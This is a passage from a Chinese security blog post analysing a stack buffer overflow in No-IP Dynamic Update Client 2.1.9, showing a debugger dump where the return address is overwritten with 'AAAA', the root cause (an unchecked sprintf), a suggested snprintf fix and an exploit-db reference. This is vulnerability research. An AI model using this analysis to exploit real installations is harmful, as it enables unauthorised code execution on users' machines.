+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0xffffffff</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8864 (_IO_stdfile_2_lock) ◂— 0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */</span><br><span class="line"> EBP  0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> ESP  0xffffd40c ◂— &apos;AAAA&apos;</span><br><span class="line"> EIP  0x804c3e8 (dynamic_update+1029) ◂— ret    </span><br><span class="line">───────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x804c25f &lt;dynamic_update+636&gt;     je     dynamic_update+1013 &lt;0x804c3d8&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x804c3d8 &lt;dynamic_update+1013&gt;    mov    eax, dword ptr [ebp - 0x18]</span><br><span class="line">   0x804c3db &lt;dynamic_update+1016&gt;    mov    dword ptr [ebp - 0x32c], eax</span><br><span class="line">   0x804c3e1 &lt;dynamic_update+1022&gt;    mov    eax, dword ptr [ebp - 0x32c]</span><br><span class="line">   0x804c3e7 &lt;dynamic_update+1028&gt;    leave  </span><br><span class="line"> ► 0x804c3e8 &lt;dynamic_update+1029&gt;    ret    &lt;0x41414141&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd40c ◂— &apos;AAAA&apos;</span><br><span class="line">01:0004│      0xffffd410 —▸ 0x804f100 ◂— dec    ecx</span><br><span class="line">02:0008│      0xffffd414 —▸ 0xffffd4c4 —▸ 0xffffd60b ◂— 0x6d6f682f (&apos;/hom&apos;)</span><br><span class="line">03:000c│      0xffffd418 —▸ 0x8053020 (buffer) ◂— 0x20544500</span><br><span class="line">04:0010│      0xffffd41c —▸ 0xf7ffd918 ◂— 0</span><br><span class="line">05:0014│      0xffffd420 —▸ 0x8052520 (__libc_start_main@got.plt) —▸ 0xf7e1d540 (__libc_start_main) ◂— call   0xf7f24b59</span><br><span class="line">06:0018│      0xffffd424 —▸ 0x8053020 (buffer) ◂— 0x20544500</span><br><span class="line">07:001c│      0xffffd428 ◂— 0x0</span><br><span class="line">──────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  804c3e8 dynamic_update+1029</span><br><span class="line">   f 1 41414141</span><br></pre></td></tr></table></figure>
+
+<h1 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h1><p>所以漏洞成因就是dynamic_update中的<code>sprintf(&amp;s, &quot;&amp;ip=%s&quot;, &amp;IPaddress);</code>拼接，建议使用snprintf</p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.exploit-db.com/exploits/25411" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/25411</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2019/01/08/No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析/" title="No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析">https://www.giantbranch.cn/2019/01/08/No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+          
+            <a href="/tags/溢出/" rel="tag"># 溢出</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/29/CTF PWN之house of orange/" rel="next" title="CTF PWN之house of orange">
+                <i class="fa fa-chevron-left"></i> CTF PWN之house of orange
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/01/Chrome浏览器打开PDF文件信息泄露漏洞简析/" rel="prev" title="Chrome浏览器打开PDF文件信息泄露漏洞简析">
+                Chrome浏览器打开PDF文件信息泄露漏洞简析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单总结"><span class="nav-number">3.</span> <span class="nav-text">简单总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reference"><span class="nav-number">4.</span> <span class="nav-text">reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2019/01/08/No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析/';
+          this.page.identifier = '2019/01/08/No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析/';
+          this.page.title = 'No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
